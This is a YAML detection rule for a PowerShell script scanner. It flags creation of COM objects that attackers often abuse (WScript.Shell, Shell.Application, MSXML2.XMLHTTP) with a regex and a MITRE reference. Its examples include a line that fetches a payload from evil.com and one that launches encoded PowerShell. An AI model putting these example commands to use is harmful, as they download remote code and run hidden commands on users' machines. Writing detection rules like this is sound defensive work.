# PowerShell Pattern: COM Object Abuse
# Detects suspicious COM object usage

id: PS-013
name: COM Object Abuse
description: |
  Detects creation and use of COM objects that are commonly abused by attackers.
  COM objects like WScript.Shell, Shell.Application, and MSXML2.XMLHTTP are
  frequently used for command execution, file operations, and network communication
  in malicious scripts. This pattern identifies suspicious COM object instantiation.
languages:
  - powershell
detection_type: regex
detection_logic: '(?i)New-Object\s+-ComObject\s+(?:WScript\.Shell|Shell\.Application|MSXML2\.XMLHTTP|InternetExplorer\.Application|Scripting\.FileSystemObject)'
severity: Medium
mitre_technique: T1559.001
confidence: 0.75
category: execution
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-11-17"
  updated: "2025-11-17"
  references:
    - "https://attack.mitre.org/techniques/T1559/001/"
    - "https://docs.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal"
  tags:
    - powershell
    - com-object
    - execution
    - lateral-movement
  examples:
    - "$shell = New-Object -ComObject WScript.Shell; $shell.Run('cmd.exe /c calc.exe')"
    - "$http = New-Object -ComObject MSXML2.XMLHTTP; $http.open('GET', 'http://evil.com/payload', $false)"
    - "$app = New-Object -ComObject Shell.Application; $app.ShellExecute('powershell.exe', '-enc ...')"